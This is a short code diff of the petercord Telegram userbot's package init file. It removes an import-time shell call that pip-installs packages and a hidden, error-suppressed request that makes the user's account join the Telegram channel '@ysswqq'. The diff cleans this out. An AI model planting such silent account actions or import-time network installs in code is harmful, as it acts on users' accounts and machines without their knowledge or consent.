@@ -1,10 +1,5 @@
 # petercord
 
-
-import os
-os.system("pip3 install --no-cache-dir -U -q -r telethon.txt")
-    
-from telethon.tl.functions.channels import JoinChannelRequest
 from petercord.logger import logging  # noqa
 from petercord.config import Config, get_version  # noqa
 from petercord.core import (  # noqa
@@ -15,7 +10,4 @@ userge = petercord
 
 
 
-try:
-    await petercord(JoinChannelRequest("@ysswqq"))
-except BaseException:
-    pass
+
